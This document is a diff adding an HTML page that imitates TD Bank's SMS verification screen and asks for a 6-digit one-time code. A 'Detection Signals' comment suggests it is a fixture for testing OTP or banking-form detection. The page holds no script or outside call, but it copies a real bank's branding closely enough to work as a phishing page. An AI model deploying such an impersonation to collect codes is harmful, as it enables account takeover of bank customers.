@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TD Bank - Authentication Required</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f9f9f9; margin: 0; padding: 20px; }
+        .td-wrapper { max-width: 520px; margin: 30px auto; }
+        .td-header { background: #0d8700; color: white; padding: 20px; border-radius: 8px 8px 0 0; }
+        .td-logo { font-size: 26px; font-weight: bold; }
+        .td-content { background: white; padding: 35px; border-radius: 0 0 8px 8px; box-shadow: 0 3px 15px rgba(0,0,0,0.1); }
+        .td-title { color: #0d8700; margin-bottom: 20px; font-size: 24px; }
+        .td-message { color: #333; margin-bottom: 25px; line-height: 1.6; }
+        .td-form-group { margin-bottom: 20px; }
+        .td-label { display: block; color: #333; margin-bottom: 8px; font-size: 14px; font-weight: 600; }
+        .td-input { width: 100%; padding: 13px; border: 1px solid #d0d0d0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        .td-input:focus { border-color: #0d8700; outline: none; box-shadow: 0 0 0 3px rgba(13, 135, 0, 0.1); }
+        .td-button { width: 100%; padding: 14px; background: #0d8700; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .td-button:hover { background: #0b7300; }
+        .td-info { background: #f0f7ff; border-left: 4px solid #0066cc; padding: 15px; margin-bottom: 20px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <!-- Detection Signals:
+         - Banking domain: td bank, tdbank
+         - Security keywords: authentication, verification code, secure
+         - Input patterns: numeric code, SMS verification
+         - Form structure: labeled form groups, info boxes
+         - Brand colors: #0d8700 (TD green)
+         - Common names: verificationCode, authenticationCode, smsCode
+    -->
+    <div class="td-wrapper">
+        <div class="td-header">
+            <div class="td-logo">TD Bank</div>
+        </div>
+
+        <div class="td-content">
+            <h1 class="td-title">Authentication Required</h1>
+
+            <div class="td-info">
+                <strong>📱 SMS Verification:</strong> We've sent a secure code to your mobile device for authentication.
+            </div>
+
+            <p class="td-message">
+                Please enter the 6-digit verification code we sent to your phone number ending in **7890.
+            </p>
+
+            <form id="authenticationForm" action="/online/verify-code" method="POST">
+                <div class="td-form-group">
+                    <label for="verificationCode" class="td-label">Verification Code</label>
+                    <input
+                        type="tel"
+                        id="verificationCode"
+                        name="verification_code"
+                        class="td-input"
+                        placeholder="Enter 6-digit code"
+                        maxlength="6"
+                        pattern="[0-9]{6}"
+                        inputmode="numeric"
+                        autocomplete="one-time-code"
+                        aria-required="true"
+                        required
+                    />
+                </div>
+
+                <button type="submit" class="td-button">Submit Code</button>
+            </form>
+
+            <div style="margin-top: 25px; text-align: center; font-size: 14px;">
+                <a href="#" style="color: #0066cc; text-decoration: none;">Request a new code</a> |
+                <a href="#" style="color: #0066cc; text-decoration: none;">Use another method</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
